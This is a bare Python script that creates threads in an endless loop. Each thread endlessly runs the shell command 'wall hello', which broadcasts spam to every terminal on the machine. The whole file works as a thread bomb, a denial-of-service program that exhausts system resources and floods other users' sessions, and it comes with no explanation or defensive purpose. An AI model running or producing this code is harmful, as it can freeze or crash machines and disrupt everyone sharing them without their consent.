import threading
import os

def spam():
 while True:
  os.system("wall hello")

while True:
 t = threading.Thread(target=spam)
 t.start()
